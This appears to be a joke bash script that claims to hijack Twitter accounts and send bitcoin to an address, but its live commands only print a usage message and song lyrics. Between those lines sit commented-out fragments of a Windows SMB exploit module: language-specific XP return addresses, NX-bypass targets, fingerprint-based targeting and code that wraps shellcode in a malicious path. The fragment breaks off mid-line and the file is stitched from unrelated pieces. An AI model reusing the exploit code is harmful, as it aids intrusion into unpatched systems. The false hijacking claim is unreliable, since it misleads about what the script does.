#!/usr/bin/env bash

##################################################################
#                                                                #
# Script to hijack Twitter Accounts                              #
# Automates sending bitcoin to address:                          #
# - bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh                   #
#                                                                #
# Notes:                                                         #
#        - Usage ./twitterHijack.sh <Twitter Handle>             #
#        - Example ./twitterHijack.sh elonmusk                   #
#                                                                #
# Written by Tinker. For Demonstration Purposes Only.            #
#                                                                #
##################################################################

USAGE="
Bash script to hijack Twitter Accounts

Flags:
-u    Twitter Handle

usage:   twitterHijack.sh -u <twitter handle>
example: twitterHijack.sh -u elonmusk
"

# Check if any flags were set. If not, print out help.
if [ $# -eq 0 ]; then
        echo "$USAGE"
        exit
fi

#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Arabic (NX)',
#                {
#                'Ret' => 0x6fd8f727,
#                'DisableNX' => 0x6fd916e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Chinese - Traditional / Taiwan (NX)',
#                {
#                'Ret' => 0x5860f727,
#                'DisableNX' => 0x586116e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Chinese - Simplified (NX)',
#                {
#                'Ret' => 0x58fbf727,
#                'DisableNX' => 0x58fc16e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Chinese - Traditional (NX)',
#                {
#                'Ret' => 0x5860f727,
#                'DisableNX' => 0x586116e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Czech (NX)',
#                {
#                'Ret' => 0x6fe1f727,
#                'DisableNX' => 0x6fe216e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Danish (NX)',
#                {
#                'Ret' => 0x5978f727,
#                'DisableNX' => 0x597916e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 German (NX)',
#                {
#                'Ret' => 0x6fd9f727,
#                'DisableNX' => 0x6fda16e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
		 echo "We're no strangers to love"
#
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Greek (NX)',
#                {
#                'Ret' => 0x592af727,
#                'DisableNX' => 0x592b16e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Spanish (NX)',
#                {
#                'Ret' => 0x6fdbf727,
#                'DisableNX' => 0x6fdc16e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
		 echo "You know the rules and so do I."
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Finnish (NX)',
#                {
#                'Ret' => 0x597df727,
#                'DisableNX' => 0x597e16e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 French (NX)',
#                {
#                'Ret' => 0x595bf727,
#                'DisableNX' => 0x595c16e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
                 echo "A full commitment's what I'm thinking of."
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Hebrew (NX)',
#                {
#                'Ret' => 0x5940f727,
#                'DisableNX' => 0x594116e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Hungarian (NX)',
#                {
#                'Ret' => 0x5970f727,
#                'DisableNX' => 0x597116e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
		 echo "You wouldn't get this from any other guy."
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Italian (NX)',
#                {
#                'Ret' => 0x596bf727,
#                'DisableNX' => 0x596c16e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Japanese (NX)',
#                {
#                'Ret' => 0x567fd3be,
#                'DisableNX' => 0x568016e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
		 echo "I just wanna tell you how I'm feeling."
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Korean (NX)',
#                {
#                'Ret' => 0x6fd6f727,
#                'DisableNX' => 0x6fd716e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Dutch (NX)',
#                {
#                'Ret' => 0x596cf727,
#                'DisableNX' => 0x596d16e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
		 echo "Gotta make you understand"
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Norwegian (NX)',
#                {
#                'Ret' => 0x597cf727,
#                'DisableNX' => 0x597d16e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Polish (NX)',
#                {
#                'Ret' => 0x5941f727,
#                'DisableNX' => 0x594216e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
		 echo "Never gonna give you up."
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Portuguese - Brazilian (NX)',
#                {
#                'Ret' => 0x596ff727,
#                'DisableNX' => 0x597016e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Portuguese (NX)',
#                {
#                'Ret' => 0x596bf727,
#                'DisableNX' => 0x596c16e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
		 echo "Never gonna let you down."
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Russian (NX)',
#                {
#                'Ret' => 0x6fe1f727,
#                'DisableNX' => 0x6fe216e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Swedish (NX)',
#                {
#                'Ret' => 0x597af727,
#                'DisableNX' => 0x597b16e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
		 echo "Never gonna run around and desert you."
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP2 Turkish (NX)',
#                {
#                'Ret' => 0x5a78f727,
#                'DisableNX' => 0x5a7916e2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Arabic (NX)',
#                {
#                'Ret' => 0x6fd8f807,
#                'DisableNX' => 0x6fd917c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
		 echo "Never gonna make you cry."
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Chinese - Traditional / Taiwan (NX)',
#                {
#                'Ret' => 0x5860f807,
#                'DisableNX' => 0x586117c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Chinese - Simplified (NX)',
#                {
#                'Ret' => 0x58fbf807,
#                'DisableNX' => 0x58fc17c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
		 echo "Never gonna say goodbye."
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Chinese - Traditional (NX)',
#                {
#                'Ret' => 0x5860f807,
#                'DisableNX' => 0x586117c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Czech (NX)',
#                {
#                'Ret' => 0x6fe1f807,
#                'DisableNX' => 0x6fe217c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
		 echo "Never gonna tell a lie and hurt you."
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Danish (NX)',
#                {
#                'Ret' => 0x5978f807,
#                'DisableNX' => 0x597917c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 German (NX)',
#                {
#                'Ret' => 0x6fd9f807,
#                'DisableNX' => 0x6fda17c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Greek (NX)',
#                {
#                'Ret' => 0x592af807,
#                'DisableNX' => 0x592b17c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Spanish (NX)',
#                {
#                'Ret' => 0x6fdbf807,
#                'DisableNX' => 0x6fdc17c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Finnish (NX)',
#                {
#                'Ret' => 0x597df807,
#                'DisableNX' => 0x597e17c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 French (NX)',
#                {
#                'Ret' => 0x595bf807,
#                'DisableNX' => 0x595c17c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Hebrew (NX)',
#                {
#                'Ret' => 0x5940f807,
#                'DisableNX' => 0x594117c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Hungarian (NX)',
#                {
#                'Ret' => 0x5970f807,
#                'DisableNX' => 0x597117c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Italian (NX)',
#                {
#                'Ret' => 0x596bf807,
#                'DisableNX' => 0x596c17c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Japanese (NX)',
#                {
#                'Ret' => 0x567fd4d2,
#                'DisableNX' => 0x568017c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Korean (NX)',
#                {
#                'Ret' => 0x6fd6f807,
#                'DisableNX' => 0x6fd717c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Dutch (NX)',
#                {
#                'Ret' => 0x596cf807,
#                'DisableNX' => 0x596d17c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Norwegian (NX)',
#                {
#                'Ret' => 0x597cf807,
#                'DisableNX' => 0x597d17c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Polish (NX)',
#                {
#                'Ret' => 0x5941f807,
#                'DisableNX' => 0x594217c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Portuguese - Brazilian (NX)',
#                {
#                'Ret' => 0x596ff807,
#                'DisableNX' => 0x597017c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Portuguese (NX)',
#                {
#                'Ret' => 0x596bf807,
#                'DisableNX' => 0x596c17c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Russian (NX)',
#                {
#                'Ret' => 0x6fe1f807,
#                'DisableNX' => 0x6fe217c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Swedish (NX)',
#                {
#                'Ret' => 0x597af807,
#                'DisableNX' => 0x597b17c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#                
#                # NX bypass for XP SP2/SP3
#                [ 'Windows XP SP3 Turkish (NX)',
#                {
#                'Ret' => 0x5a78f807,
#                'DisableNX' => 0x5a7917c2,
#                'Scratch' => 0x00020408
#                }
#                ], # JMP ESI ACGENRAL.DLL, NX/NX BYPASS ACGENRAL.DLL
#
# def exploit
#                
# connect()
# dns_query()
#                
#                # Use a copy of the target
#                mytarget = target
#                
#                
#                if(target['auto'])
#                
#                mytarget = nil
#                
#                print_status("Automatically detecting the target...")
#                fprint = smb_fingerprint()
#                
#                print_status("Fingerprint: #{fprint['os']} - #{fprint['sp']} - lang:#{fprint['lang']}")
#                
#                # Bail early on unknown OS
#                if(fprint['os'] == 'Unknown')
#                raise RuntimeError, "No matching target"
#                end
#                
#                # Windows 2000 is mostly universal
#                if(fprint['os'] == 'Windows 2000')
#                mytarget = self.targets[1]
#                end
#                
#                # Windows XP SP0/SP1 is mostly universal
#                if(fprint['os'] == 'Windows XP' and fprint['sp'] == "Service Pack 0 / 1")
#                mytarget = self.targets[2]
#                end
#                
#                # Windows 2003 SP0 is mostly universal
#                if(fprint['os'] == 'Windows 2003' and fprint['sp'] == "No Service Pack")
#                mytarget = self.targets[5]
#                end
#                
#                # Windows 2003 R2 is treated the same as 2003
#                if(fprint['os'] == 'Windows 2003 R2')
#                fprint['os'] = 'Windows 2003'
#                end
#                
#                # Service Pack match must be exact
#                if((not mytarget) and fprint['sp'].index('+'))
#                print_error("Could not determine the exact service pack")
#                print_status("Auto-targeting failed, use 'show targets' to manually select one")
#                disconnect
#                return
#                end
#                
#                # Language Pack match must be exact or we default to English
#                if((not mytarget) and fprint['lang'] == 'Unknown')
#                print_status("We could not detect the language pack, defaulting to English")
#                fprint['lang'] = 'English'
#                end
#                
#                # Normalize the service pack string
#                fprint['sp'].gsub!(/Service Packs+/, 'SP')
#                
#                if(not mytarget)
#                self.targets.each do |t|
#                if(t.name =~ /#{fprint['os']} #{fprint['sp']} #{fprint['lang']} (NX)/)
#                mytarget = t
#                break
#                end
#                end
#                end
#                
#                if(not mytarget)
#                raise RuntimeError, "No matching target"
#                end
#                
#                print_status("Selected Target: #{mytarget.name}")
#                end
#                
#                #
#                # Build the malicious path name
#                #
#                
#                padder = [*("A".."Z")]
#                pad = "A"
#                while(pad.length < 7)
#                c = padder[rand(padder.length)]
#                next if pad.index(c)
#                pad += c
#                end
#                
#                prefix = "\"
#                path = ""
#                server = Rex::Text.rand_text_alpha(rand(8)+1).upcase
#                
#                
#                #
#                # Windows 2000, XP (NX), and 2003 (NO NX) mytargets
#                #
#                if(not mytarget['RetDec'])
#                
#                jumper = Rex::Text.rand_text_alpha(70).upcase
#                jumper[ 4,4] = [mytarget.ret].pack("V")
#                jumper[50,8] = make_nops(8)
#                jumper[58,2] = "xebx62"
#                
#                path =
#                Rex::Text.to_unicode("\") +
#                
#                # This buffer is removed from the front
#                Rex::Text.rand_text_alpha(100) +
#                
#                # Shellcode
#                payload.encoded +
#                
#                # Relative path to trigger the bug
#                Rex::Text.to_unicode("\..\..\") +
#                
#                # Extra padding
#                Rex::Text.to_unicode(pad) +
#                
#                # Writable memory location (static)
#                [mytarget['Scratch']].pack("V") + # EBP
#                
#                # Return to code which disables NX (or just the return)
#                [ mytarget['DisableNX'] || mytarget.ret ].pack("V") +
#                
#                # Padding with embedded jump
#                jumper +
#                
#                # NULL termination
#                "x00" doc.txt notes 2
echo "100% Open Source!"
